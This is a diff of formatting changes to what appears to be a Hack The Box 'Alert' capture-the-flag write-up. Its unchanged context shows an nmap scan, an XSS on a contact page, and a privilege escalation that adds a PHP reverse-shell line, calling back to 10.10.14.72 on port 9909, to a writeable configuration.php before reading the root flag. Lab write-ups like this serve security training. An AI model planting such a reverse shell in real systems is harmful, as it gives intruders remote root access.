@@ -2,7 +2,7 @@
 
 ![](../.gitbook/assets/d6657ac653fbaac0234f05d4af35f49d.png)
 
-#### Port Scan
+## Port Scan
 
 ```shell
 # Nmap 7.94SVN scan initiated Tue Nov 26 17:13:16 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o port_scan 10.129.68.51
@@ -35,7 +35,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-#### Enumeration
+## Enumeration
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Alert]
@@ -51,7 +51,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ![](../.gitbook/assets/0ff1f90ec311458c467ff1983ed9bf33.png)
 
-#### XSS
+## XSS
 
 By **Contact Us** page we are able to perform XSS attack:
 
@@ -164,7 +164,7 @@ Login trough SSH into albert:
 userflag:de185f1ff*******************
 ```
 
-#### Privilege Escalation
+## Privilege Escalation
 
 From netsat we can see that there is a service running on port **8080**
 
@@ -176,7 +176,7 @@ From netsat we can see that there is a service running on port **8080**
 
 The file **/opt/website-monitor/config/configuration.php** is writeable:
 
-![](../.gitbook/assets/13f3b82f37651b33769179083c64c6a8.png)
+<div data-full-width="false"><img src="../.gitbook/assets/13f3b82f37651b33769179083c64c6a8.png" alt=""></div>
 
 Add this line to **configuration.php**
 
@@ -184,6 +184,7 @@ Add this line to **configuration.php**
 $sock=fsockopen("10.10.14.72",9909);shell_exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 
+{% code fullWidth="false" %}
 ```shell
 curl http://localhost:8080/config/configuration.php
 ---------------------------------------------------
@@ -199,8 +200,9 @@ root.txt
 scripts
 # cat root.txt  
 ```
+{% endcode %}
 
-![](../.gitbook/assets/4ecc2194c78c07dbf8aa6e74d016a2d5.png)
+<div align="center" data-full-width="true"><img src="../.gitbook/assets/4ecc2194c78c07dbf8aa6e74d016a2d5.png" alt=""></div>
 
 ```shell
 rootflag:238a5640d5acdd*****************
